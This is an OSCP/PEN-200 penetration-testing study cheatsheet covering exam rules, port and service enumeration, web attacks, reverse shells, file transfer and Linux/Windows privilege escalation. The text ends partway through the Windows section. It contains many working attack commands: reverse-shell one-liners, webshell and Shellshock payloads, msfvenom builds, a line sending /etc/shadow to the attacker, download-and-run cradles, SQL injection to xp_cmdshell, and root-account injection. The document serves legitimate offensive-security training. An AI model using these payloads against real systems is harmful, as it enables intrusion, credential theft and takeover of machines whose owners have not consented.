# OSCP Notes

Study cheatsheet for **OSCP / OSCP+ (PEN-200)**. Re-read the official [OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) and [Exam FAQ](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ) on exam day; OffSec’s rules override anything here.

**Abstract.** These notes follow the exam loop: enumerate every port, get a foothold, stabilize a real shell, loot credentials, escalate, then pivot. They cover scoring and restrictions, TCP/UDP recon, common services, web attacks (manual SQLi — SQLmap is banned), shells and file transfer, Linux/Windows privilege escalation, assumed-breach Active Directory (including ADCS), tunneling, cracking, post-exploitation, and the report. Prefer **NetExec (`nxc`)** over old CrackMapExec. Placeholders: `<RHOST>` target, `<LHOST>` you, `<LPORT>` listener, `<USER>` / `<PASS>` / `<HASH>`, `<DOMAIN>`, `<DC>`.

| Section | What it covers |
| --- | --- |
| [Exam day](#exam-day) | Scoring, proofs, restrictions, Metasploit lock, VPN, report upload |
| [Methodology](#methodology) | Workspace, evidence clock, credential reuse, when stuck |
| [Recon & port scanning](#reconnaissance--port-scanning) | Nmap TCP/UDP, NSE, port → next action |
| [Services](#services) | FTP, SSH, SMB, SNMP, DNS, SMTP, NFS, RPC, LDAP, RDP, WinRM, DBs, Redis, TFTP, rsync, Docker, Mongo |
| [HTTP/S & web](#https--web) | Vhosts, dirs, CMS, LFI/RFI, SQLi, SSTI, upload, Git, Hydra |
| [Fuzzing](#fuzzing) | ffuf, gobuster, feroxbuster |
| [Shells & file transfer](#shells--file-transfer) | Reverse shells, TTY, msfvenom, Linux/Windows transfer |
| [Linux privilege escalation](#linux-privilege-escalation) | sudo, SUID, caps, cron, NFS, Docker, GTFOBins |
| [Windows privilege escalation](#windows-privilege-escalation) | Tokens, Potatoes, services, Backup Operators, SAM |
| [Active Directory](#active-directory) | Assumed breach, BloodHound, roast, RBCD, ACL, bloodyAD, lateral |
| [Certificate abuse (ADCS)](#certificate-abuse-adcs) | Certipy / Certify, ESC1/ESC8, shadow credentials |
| [Tunneling & pivoting](#tunneling--pivoting) | Ligolo-ng, Chisel, Proxychains, SSH |
| [Credentials & cracking](#credentials--cracking) | Spray strategy, John, Hashcat modes, defaults |
| [Post-exploitation](#post-exploitation) | Loot, KeePass, history, internal ports |
| [Reporting](#reporting) | Screenshots, PDF / `.7z` names |
| [Useful links](#useful-links) | Official docs and public references |

---

## Exam day

| Block | Points | Notes |
| --- | --- | --- |
| 3 standalone machines | 60 | 20 each: **10** `local.txt` + **10** `proof.txt` |
| AD set (3 hosts) | 40 | Assumed breach — OffSec gives a domain user/password |
| AD machine #1 / #2 / #3 | 10 / 10 / 20 | Partial AD credit is real |
| Pass | **70 / 100** | No bonus points |

Official 70-point combinations: 40 AD + 3× `local.txt` · 40 AD + 2× `local.txt` + 1× `proof.txt` · 20 AD + 3× `local.txt` + 2× `proof.txt` · 10 AD + 3 fully completed standalones.

Report order = grading order. Bank flags immediately. Passing the current exam typically awards **OSCP** (lifetime) and **OSCP+** (3-year active). Confirm on OffSec.

### Time (23h 45m)

After a 30-minute sweep of **all** hosts, attack the strongest evidence. Do not lock “AD first” before you have scans.

```
00:00–00:30  VPN, folders, /etc/hosts, nmap ALL targets in parallel, read control panel
00:30–04:00  AD if it looks like a normal assumed-breach set (BloodHound, nxc, roast, MS01)
04:00–08:00  Standalone with the clearest foothold
08:00–13:00  Next standalone
13:00–18:00  Last standalone / remaining AD hops
18:00–22:00  Revisit stuck boxes (30–45 min rotation)
22:00–23:45  Proofs in control panel, screenshots, report skeleton
```

Sleep and eat. 24 reverts (reset once). Machines start fresh — do not revert blindly.

### Proofs

1. Submit flag text in the **control panel** before the attack window ends (panel does not confirm correctness).
2. Screenshot from an **interactive shell** (`cat` / `type`) of the file in its **original path**.
3. Same screenshot must show the target IP (`ip addr` / `ifconfig` / `ipconfig`).
4. Web shells and “copied the file to Kali” do **not** count.

```bash
id; hostname; ip addr
cat /home/<USER>/local.txt
cat /root/proof.txt
```

```cmd
whoami
hostname
ipconfig
type C:\Users\<USER>\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt
```

Windows full points: shell as **SYSTEM**, **Administrator**, or Administrators. Linux: **root**. PowerShell Remoting / `Enter-PSSession` counts as interactive.

### Restrictions

**Banned:** spoofing (IP/ARP/DNS/NBNS/LLMNR poison); automatic exploitation (**SQLmap**, SQLninja, db_autopwn); mass scanners (Nessus, OpenVAS); AI chatbots/LLMs during the **exam and the report** (ChatGPT, KAI, Gemini, Copilot, DeepSeek).

Notion-style organisers and Google AI Overview are allowed. Interactive “ask the model to solve this” is not. [AI Usage Policy](https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams).

**Allowed examples (FAQ, not exhaustive):** Nmap/NSE, Nikto, Burp Community, DirBuster-style discovery, BloodHound Legacy/CE, SharpHound, PowerView, Rubeus, evil-winrm, CrackMapExec/NetExec, Mimikatz, Impacket, PrintSpoofer.

**Responder** is listed as allowed; **poisoning/spoofing is not**. Open book: notes, Google, OffSec platform. Do not discuss **this** exam anywhere.

| Metasploit | Rule |
| --- | --- |
| `msfvenom` | All targets |
| `exploit/multi/handler` | All targets |
| Auxiliary / Exploit / Post / Meterpreter | **One** machine, then locked (`check` counts) |
| Pivoting with Metasploit | **No** |

If a module fails on host A, you cannot try host B.

### VPN and control panel

```bash
tar xvfj exam-connection.tar.bz2
sudo openvpn OS-XXXXXX-OSCP.ovpn
# username/password from the exam email
```

Stay on **Kali + OpenVPN**. Panel: flags, reverts, objectives. Wait for a revert to finish.

### After the attack window (24h)

```bash
7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
md5sum OSCP-OS-XXXXX-Exam-Report.7z
```

PDF only, unpassworded `.7z`, case-sensitive names, ≤ 200 MB, upload from Kali to `https://upload.offsec.com`, verify MD5, click **Submit File**. Modified exploits: code + original URL + why. Unmodified: **URL only**. Zero points for a target if you used a restricted tool, used Metasploit on a second host, skipped the screenshot/panel submit, or under-documented.

---

## Methodology

```
Enumerate → weakness → foothold → stabilize → loot → escalate → loot again → pivot
```

After every new user, hash, or host: screenshot + submit any flag; try the secret on SMB, WinRM, RDP, SSH, MSSQL, LDAP, and web; re-run BloodHound as the **new** identity.

```bash
mkdir -p ~/exam/{ad,box1,box2,box3}/{scans,loot,exploits,screenshots,notes}
touch ~/exam/creds.txt ~/exam/hashes.txt ~/exam/todo.md
```

```text
# user : secret : where-found : where-it-worked
```

If 30–45 minutes produce no new port, vhost, share, credential, BloodHound edge, primitive, or privilege — **rotate**.

**First 30 minutes on a host:** full TCP (`-p-`) + UDP top ports; read every nmap script line; anonymous/default/`user:user` before exotic CVEs; then commit to a path.

Typical Linux standalone: web → vhost → dirbust → version/defaults → `www-data` → `sudo -l`/SUID/cron → root.

Typical Windows standalone: SMB/web/RDP/WinRM → **`whoami /priv` immediately** → SeImpersonate (Potato) or service/stored creds → SAM loot.

Typical AD: given creds → BloodHound + nxc + LDAP descriptions + shares + GPP + roast + ADCS find → local admin on MS01 → dump → Ligolo to MS02 → ACL/cert/DCSync → DA. Pivoting **may** be required.

**When stuck:** re-read `-p-` and UDP; bigger dir list + extra extensions; vhosts into `/etc/hosts`; `exiftool`/`strings`/`git log`; `sudo -l` / `whoami /priv` / `ss -tlnp` again; search `name + version + exploit`; walk 15 minutes; rotate.

Document commands as you go. Keep a `bin/` of tools you already tested.

---

## Reconnaissance & port scanning

Use `-Pn` if ICMP is blocked. Save output. Scan **all** exam hosts in parallel before tunnel-vision on port 80.

```bash
export IP=<RHOST>

sudo nmap -sC -sV --open -T4 "$IP" -oN scans/quick.txt          # basic
sudo nmap -p- --min-rate 1500 -T4 "$IP" -oN scans/all-tcp.txt   # all TCP (drop rate if VPN drops packets)
sudo nmap -sC -sV -p <PORTS> "$IP" -oA scans/tcp-full           # scripts on open ports
sudo nmap -T4 -A -p- "$IP" -v -oA scans/aggressive              # when you have time
sudo nmap -sU --top-ports 100 "$IP" -oN scans/udp.txt           # SNMP/TFTP/DNS — do not skip
```

```bash
updatedb
locate .nse | grep -i smb
sudo nmap -p 445 --script "smb-enum*" "$IP"
```

Skip NSE brute/dos scripts that lock accounts.

```powershell
Test-NetConnection -ComputerName <RHOST> -Port 445

1..1024 | ForEach-Object {
  $p = $_
  try {
    $c = New-Object System.Net.Sockets.TcpClient
    $c.Connect("<RHOST>", $p)
    if ($c.Connected) { "TCP $p open" }
    $c.Close()
  } catch {}
}
```

```bash
echo "<RHOST>  target.site www.target.site" | sudo tee -a /etc/hosts
openssl s_client -connect <RHOST>:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -i 'DNS:\|CN='
searchsploit <name> <version>
searchsploit -m <id>
```

| Port | Service | Next |
| --- | --- | --- |
| 21 | FTP | `anonymous` / `ftp:ftp`; banner → searchsploit; upload if webroot overlaps |
| 22 | SSH | Reuse creds; crack `id_rsa` |
| 25 / 587 | SMTP | VRFY / EXPN user enum |
| 53 | DNS | `dig axfr`; hostnames → `/etc/hosts` |
| 69/UDP | TFTP | `tftp <RHOST>` → `get`/`put` (no auth) |
| 79 | Finger | user enum |
| 80 / 443 / 8080 / 8443 | HTTP(S) | Web section; Tomcat/Jenkins on alt ports |
| 88 | Kerberos | AD — roast + BloodHound; `kerbrute` |
| 110 / 143 | POP3 / IMAP | banner, default creds, reuse |
| 111 | RPCbind | `rpcinfo -p`; NFS likely |
| 135 / 139 / 445 | RPC / SMB | Null session, shares, RID; `smb-vuln-ms17-010` |
| 161/UDP | SNMP | `public`/`private`; users and processes |
| 389 / 636 / 3268 | LDAP | namingContexts; descriptions |
| 512–514 | rsh / rlogin / rexec | `.rhosts` / trusted hosts |
| 873 | rsync | `rsync rsync://<RHOST>/` |
| 1099 | Java RMI | version → searchsploit / ysoserial (lab) |
| 1433 | MSSQL | `nxc mssql` / `impacket-mssqlclient` |
| 1521 | Oracle | `scott/tiger`; searchsploit the version |
| 2049 | NFS | `showmount -e`; `no_root_squash` |
| 2375 | Docker API | unauth `docker -H tcp://<RHOST>:2375 ps` |
| 3306 | MySQL | root/blank; reuse web config |
| 3389 | RDP | `xfreerdp` / nxc; Restricted Admin with hash |
| 5432 | PostgreSQL | `postgres`/`postgres`; `COPY ... PROGRAM` |
| 5900 | VNC | Password in registry/files later |
| 5985 / 5986 | WinRM | `evil-winrm`; nxc `(Pwn3d!)` |
| 6379 | Redis | Unauth `INFO`; SSH key / webshell write |
| 8009 | AJP | Tomcat (Ghostcat if unpatched) |
| 9200 | Elasticsearch | unauth `/_cat/indices?v` |
| 10000 | Webmin | default creds + version CVE |
| 11211 | Memcached | `stats`, cached keys |
| 27017 | MongoDB | unauth dump |
| 9389 | ADWS | Confirms DC |

---

## Services

Try anonymous, null, guest, and default creds before hunting CVEs. Hydra: `-L`/`-P` lists, `-l`/`-p` single value.

### FTP

```bash
ftp <RHOST>
# anonymous:anonymous   ftp:ftp
put <file>
get <file>
nmap -p 21 --script ftp-anon,ftp-syst <RHOST>
hydra -L users.txt -P passwords.txt ftp://<RHOST>
```

Writable FTP that is also a web root → drop PHP/ASPX. Check banner versions with searchsploit.

### SSH

```bash
ssh <USER>@<RHOST>
chmod 600 id_rsa
ssh <USER>@<RHOST> -i id_rsa
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
hydra -l <USER> -P passwords.txt ssh://<RHOST>
```

Same for `id_ecdsa` / `id_ed25519`. If it still asks for a password, crack the passphrase. Try the key with every username you have.

### SMB

```bash
sudo nbtscan -r <NET>/24
smbclient -L //<RHOST> -N
smbmap -H <RHOST>
nxc smb <RHOST> -u '' -p '' --shares
nxc smb <RHOST> -u guest -p '' --shares --rid-brute
enum4linux -a <RHOST>

nxc smb <RHOST> -u <USER> -p <PASS> --shares --users --groups --pass-pol
nxc smb <RHOST> -u <USER> -p <PASS> -d <DOMAIN> --shares
smbmap -H <RHOST> -u <USER> -p <PASS> -d <DOMAIN> -r <SHARE>
smbclient //<RHOST>/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'
```

Inside `smbclient`:

```
put <file>
get <file>
mask ""
recurse ON
prompt OFF
mget *
```

```bash
nxc smb <RHOST> -u <USER> -p <PASS> -M spider_plus
impacket-lookupsid '<DOMAIN>/guest'@<RHOST> -no-pass | grep SidTypeUser
nmap -p 445 --script smb-vuln-ms17-010 <RHOST>   # EternalBlue if unpatched — searchsploit, not Metasploit unless that is your one host
```

```cmd
net view \\<RHOST> /all
```

### SNMP (161/UDP)

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <RHOST>
snmp-check <RHOST> -c public
snmpbulkwalk -c public -v2c <RHOST> . > snmp.txt
strings snmp.txt | grep -iE 'user|pass|login|community'
snmpwalk -c public -v2c <RHOST> 1.3.6.1.2.1.25.4.2.1.2   # processes
snmpwalk -c public -v2c <RHOST> 1.3.6.1.2.1.25.6.3.1.2   # software
snmpwalk -c public -v2c <RHOST> 1.3.6.1.4.1.77.1.2.25    # Windows users
```

Process arguments often contain passwords.

### DNS

```bash
dig axfr @<RHOST> <DOMAIN>
dig any <DOMAIN> @<RHOST>
dnsrecon -d <DOMAIN> -n <RHOST> -t axfr
```

### SMTP

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <RHOST>
nmap -p 25 --script smtp-commands,smtp-enum-users <RHOST>
```

```
VRFY root
EXPN admin
```

### RPC / NFS

```bash
rpcinfo -p <RHOST>
showmount -e <RHOST>
cat /etc/exports
mkdir -p /mnt/nfs
sudo mount -t nfs -o rw,vers=3 <RHOST>:<SHARE> /mnt/nfs

rpcclient -U '' -N <RHOST>
rpcclient -U '<USER>%<PASS>' <RHOST>
# srvinfo, enumdomusers, enumdomgroups, getdompwinfo, queryuser
```

`no_root_squash` → Linux privesc section.

### LDAP

```bash
ldapsearch -x -H ldap://<RHOST> -s base namingcontexts
ldapsearch -x -H ldap://<DC> -D '<USER>@<DOMAIN>' -w '<PASS>' \
  -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName description info comment
nxc ldap <RHOST> -u <USER> -p <PASS> --users
```

Passwords in `description` / `info` are common on the assumed-breach set.

### RDP / WinRM

```bash
nxc rdp <RHOST> -u <USER> -p <PASS>
xfreerdp /u:<USER> /p:'<PASS>' /v:<RHOST> /cert:ignore +clipboard /dynamic-resolution
xfreerdp /u:<USER> /pth:<NTHASH> /v:<RHOST> /cert:ignore

nxc winrm <RHOST> -u <USER> -p <PASS>
evil-winrm -i <RHOST> -u <USER> -p '<PASS>'
evil-winrm -i <RHOST> -u <USER> -H <NTHASH>
evil-winrm -i <RHOST> -u <USER> -p '<PASS>' -S
```

Evil-WinRM: `upload` / `download`. Many builds: `Bypass-4MSI`.

### MSSQL

```bash
nxc mssql <RHOST> -u <USER> -p '<PASS>'
nxc mssql <RHOST> -u <USER> -p '<PASS>' --windows-auth
impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>@<RHOST>' -windows-auth
impacket-mssqlclient '<USER>:<PASS>@<RHOST>'
```

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC sp_linkedservers;
```

Needs sysadmin for `xp_cmdshell`. Fetch a payload with `certutil` / `iwr` after `msfvenom`, then execute.

```bash
nxc mssql <RHOST> -u <USER> -p '<PASS>' -x whoami
nxc mssql <RHOST> -u <USER> -p '<PASS>' --windows-auth -x whoami
```

`xp_dirtree '\\<LHOST>\share'` can coerce SMB auth if you already have an allowed listener (no LLMNR poison).

### MySQL / PostgreSQL / Redis

```bash
mysql -h <RHOST> -u root -p
# FILE priv → SELECT ... INTO OUTFILE '/var/www/html/shell.php'
psql -h <RHOST> -U postgres
# superuser: COPY cmd_out FROM PROGRAM 'id';
redis-cli -h <RHOST>
INFO
CONFIG GET dir
CONFIG GET dbfilename
```

Reuse `wp-config.php` / `.env` / `web.config`. Local-only DB → tunnel then `127.0.0.1`.

Unauth Redis (lab/exam hosts only) — SSH key:

```bash
# Kali
ssh-keygen -f redis_key -t rsa -N ''
(echo -n '\n'; cat redis_key.pub; echo -n '\n') > redis_key_pad.txt
redis-cli -h <RHOST> flushall
cat redis_key_pad.txt | redis-cli -h <RHOST> -x set ssh
redis-cli -h <RHOST> CONFIG SET dir /root/.ssh
redis-cli -h <RHOST> CONFIG SET dbfilename authorized_keys
redis-cli -h <RHOST> save
ssh -i redis_key root@<RHOST>
```

Or `CONFIG SET dir` to a web root and `dbfilename` to `shell.php`.

### TFTP / rsync / Mongo / Docker API

```bash
tftp <RHOST>
# tftp> get <file>
# tftp> put shell.php

rsync rsync://<RHOST>/
rsync -av rsync://<RHOST>/<MODULE>/ loot/
# writable module → drop a key or webshell

mongosh --host <RHOST> --eval 'db.adminCommand({listDatabases:1})'
# mongodump if noauth

curl -s http://<RHOST>:2375/version
docker -H tcp://<RHOST>:2375 ps
docker -H tcp://<RHOST>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Tomcat / Jenkins / WebDAV

```bash
# Tomcat manager → WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
curl -u 'tomcat:s3cret' --upload-file shell.war \
  http://<RHOST>:8080/manager/text/deploy?path=/shell
# browse /shell

# Jenkins /script (Groovy)
# def p = ['/bin/bash','-c','bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'].execute()

curl -X OPTIONS http://<RHOST>/
curl -X PUT http://<RHOST>/shell.php --data-binary @shell.php
cadaver http://<RHOST>/
```

| App | Defaults |
| --- | --- |
| Tomcat `/manager` | `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret` → WAR |
| Jenkins | `admin:admin` / blank; `/script` Groovy |
| phpMyAdmin | reuse MySQL creds |
| WebDAV | `davtest`; PUT aspx/php |
| Grafana | `admin:admin` |
| Webmin | `admin:admin` + version CVE |

---

## HTTP/S & web

View source, `robots.txt`, SSL SAN → `/etc/hosts`, CMS/version (Wappalyzer / WhatWeb), default creds, whether FTP/SMB uploads appear on the site. Suspicious images → `exiftool`, `binwalk`, `strings`.

```bash
whatweb -v http://<RHOST>/
curl -I http://<RHOST>/
nikto -h http://<RHOST>/ -o nikto.txt
wapiti -u http://<RHOST>/
curl http://<RHOST>/robots.txt
curl http://<RHOST>/.git/HEAD
curl http://<RHOST>/.env
```

```bash
wpscan --url http://<RHOST>/ -e t,u,vp --random-user-agent
wpscan --url http://<RHOST>/ -e u -P /usr/share/wordlists/rockyou.txt
# optional: --api-token "$WPSCAN_API_TOKEN"
droopescan scan drupal http://<RHOST>/ -t 32
joomscan -u http://<RHOST>/
```

**SQLmap is banned on the exam.** Hydra / Burp Community are fine. Prefer Hydra.

```bash
hydra -L users.txt -P passwords.txt <RHOST> \
  http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid' -V
```

Use `https-post-form` / `http-get-form` to match the request. Copy the failure string from Burp.

### Path traversal / LFI / RFI

```
../../../../../../etc/passwd
....//....//....//etc/passwd
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
php://filter/convert.base64-encode/resource=/var/www/html/config.php
```

```bash
echo '<BASE64>' | base64 -d
```

Also try `~/.ssh/id_rsa`, `.env`, `web.config`, `unattend.xml`, `/proc/self/environ`, PHP session files under `/var/lib/php/sessions/`. RFI needs `allow_url_include` — host `http://<LHOST>/shell.txt`.

Log poison → include the log (User-Agent or SSH username):

```bash
curl -A '<?php system($_GET["c"]); ?>' http://<RHOST>/
# then LFI: /var/log/apache2/access.log  or  /var/log/nginx/access.log  or  /var/log/auth.log
```

`/cgi-bin/` + old Bash → Shellshock: `() { :; }; /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'`

### SSRF / XXE (quick probes)

```
http://127.0.0.1:<PORT>/
http://169.254.169.254/   # cloud metadata — skip if out of exam scope
file:///etc/passwd
```

```xml
<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
```

### Command injection / SSTI / upload

Probes: `; | || && & \` $() %0a %3B` → `127.0.0.1; id`

| Probe | If it becomes 49 |
| --- | --- |
| `{{7*7}}` | Jinja2 / Twig |
| `${7*7}` | FreeMarker / Mako |
| `<%= 7*7 %>` | ERB |

Lookup the **exact** engine before pasting an RCE gadget. Common Jinja2 RCE:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Upload bypass: Content-Type `image/jpeg`, magic `GIF89a`, `shell.php.jpg`, `shell.pHp`, `.phtml` `.phar` `.aspx`. If `/cgi-bin/` exists, fuzz `.sh` `.pl`. WordPress: `/xmlrpc.php` + `wpscan --enumerate u` then brute; theme/plugin editor if you get wp-admin.

### SQL injection (manual)

```
' OR '1'='1'-- -
admin'--
```

UNION → column count → `user()` / `database()` / `load_file()` (MySQL) or stacked queries (MSSQL):

```sql
admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --
admin'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
admin'; EXEC xp_cmdshell 'whoami'; --
```

```bash
curl -F filename="shell.php" -F file=@shell.php http://<RHOST>/upload
```

### Git

```bash
git-dumper http://<RHOST>/.git dump
cd dump && git status && git log && git diff && git show
```

[GitHacker](https://github.com/WangYihang/GitHacker). Deleted creds live in old commits.

Fuzz `/api/v1/FUZZ`, `/swagger`, `/openapi.json`, `/actuator`, `/console` (Werkzeug), `/jolokia`.

---

## Fuzzing

### Subdomains / vhosts

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://<RHOST>/ -H 'Host: FUZZ.<DOMAIN>' -ac

gobuster vhost -u http://<DOMAIN> \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --append-domain
```

Add hits to `/etc/hosts`.

### Directories

```bash
gobuster dir -u http://<RHOST>/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,zip,old,aspx,jsp -t 40 -o gobuster.txt

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<RHOST>/FUZZ
feroxbuster -u http://<RHOST>/ -x php,txt,bak --depth 3

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u 'http://<RHOST>/page.php?FUZZ=test' -mc 200,301,302,500 -fs 0
```

---

## Shells & file transfer

A **web shell is not a valid proof**. Upgrade to interactive `bash` / `cmd` first.

```bash
rlwrap nc -lvnp <LPORT>
```

```text
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT>
run
```

```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
nc <LHOST> <LPORT> -e /bin/bash
nc.exe <LHOST> <LPORT> -e cmd.exe
busybox nc <LHOST> <LPORT> -e /bin/sh
```

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"); ?>
```

More one-liners: [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o hijack.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o reverse.msi
```

TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
reset
export TERM=xterm
```

Fallbacks: `/bin/bash -i`, `script /dev/null -c bash`.

### Linux transfer

```bash
python3 -m http.server 8001
wget http://<LHOST>:8001/file
curl http://<LHOST>:8001/file -o file

# Kali listens, target pulls
nc -lvnp 1234 < linpeas.sh
# target: nc <LHOST> 1234 > linpeas.sh

# Kali catches loot
nc -lvnp 1234 > loot.bin
# target: nc <LHOST> 1234 < /etc/shadow
```

### Windows transfer

```powershell
iwr -uri http://<LHOST>:8001/file.exe -Outfile C:\Windows\Tasks\file.exe
certutil -urlcache -split -f http://<LHOST>:8001/file.exe C:\Temp\file.exe
curl.exe -o C:\Temp\file.exe http://<LHOST>:8001/file.exe
bitsadmin /transfer n http://<LHOST>:8001/file.exe C:\Temp\file.exe
copy \\<LHOST>\share\file.exe .
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')
```

```bash
impacket-smbserver share . -smb2support
impacket-smbserver share . -smb2support -user aa -password aa
```

```cmd
net use \\<LHOST>\share /u:aa aa
copy C:\Temp\loot.kdbx \\<LHOST>\share\
```

[precompiled-binaries](https://github.com/jakobfriedl/precompiled-binaries) — verify hashes yourself. Extra transfer ideas: [ironhackers cheatsheet](https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/).

---

## Linux privilege escalation

Order: **`sudo -l` → SUID → capabilities → cron → files → NFS/Docker → kernel last**. linPEAS is leads, not answers. Every sudo/SUID hit → [GTFOBins](https://gtfobins.github.io/).

```bash
id; hostname; uname -a; cat /etc/os-release
sudo -l
env
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
find / -writable -type d 2>/dev/null
dpkg -l
cat /etc/fstab; lsblk; lsmod
ss -tlnp
linpeas.sh
LinEnum.sh
pspy64
watch -n 1 'ps aux | grep -i pass'
```

Internal listeners (`127.0.0.1:3306`) → pivot section. Metasploit `local_exploit_suggester` counts as Metasploit on **that** host.

```bash
sudo find . -exec /bin/bash \; -p
sudo python3 -c 'import os; os.system("/bin/bash")'
# vim: :!/bin/bash
sudo LD_PRELOAD=/tmp/preload.so <ALLOWED_BIN>
```

Common binaries: `find`, `vim`, `less`, `python`, `perl`, `awk`, `nmap`, `env`, `tar`, `systemctl`. `sudo -u <other>` still matters.

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
# cap_setuid+ep on python:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

PATH hijack if a SUID binary calls `curl` without a full path:

```bash
export PATH=/tmp:$PATH
echo '/bin/bash -p' > /tmp/curl && chmod +x /tmp/curl
```

```bash
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs /etc/sudoers.d 2>/dev/null
systemctl list-timers --all
find / -writable -type f 2>/dev/null | grep -vE '/proc|/sys|/dev'
```

Writable root cron / systemd unit → append a reverse shell. Wildcard `tar *` → GTFOBins tar. Writable Python on `sudo` PYTHONPATH / `sitecustomize.py` hijack.

```bash
openssl passwd -1 'NewPass123!'
# append to writable /etc/passwd:  hack:$1$...:0:0:root:/root:/bin/bash
su hack
```

NFS `no_root_squash` (Kali as root):

```bash
sudo mount -t nfs <RHOST>:<SHARE> /mnt/nfs
cp /bin/bash /mnt/nfs/bash && chmod 4755 /mnt/nfs/bash
# target: /mnt/share/bash -p
```

```bash
id   # docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
uname -a
searchsploit linux kernel <version>
tmux ls; screen -ls
find / -name id_rsa -o -name id_ed25519 2>/dev/null
```

---

## Windows privilege escalation

```cmd
whoami
whoami /priv
whoami /groups
hostname
ipconfig /all
```

**SeImpersonatePrivilege** / **SeAssignPrimaryTokenPrivilege** → Potato. Most common OSCP Windows privesc.

```text
winpeas.exe
PowerUp.ps1          # Invoke-AllChecks
PrivescCheck.ps1
JAWS-enum.ps1
```

```powershell
Get-History
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName
Get-Process | Select ProcessName, Path
Get-CimInstance Win32_Service | Select Name, State, PathName, StartName | Where-Object { $_.State -eq 'Running' }
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config,*.xml,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

| Privilege | Path |
| --- | --- |
| SeImpersonate / SeAssignPrimaryToken | GodPotato / PrintSpoofer / JuicyPotatoNG / RoguePotato |
| SeBackup + SeRestore | SAM / NTDS (Backup Operators) |
| SeDebug | LSASS / Mimikatz |
| SeTakeOwnership | takeown + icacls on a service binary |

```cmd
PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -c "nc.exe <LHOST> <LPORT> -e cmd"
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\Windows\Tasks\shell.exe"
JuicyPotatoNG.exe -t * -p C:\Windows\Tasks\shell.exe -a
RoguePotato.exe -r <LHOST> -e shell.exe -l 9999
SharpEfsPotato.exe -p C:\Windows\Tasks\nc.exe -a "<LHOST> <LPORT> -e cmd.exe"
```

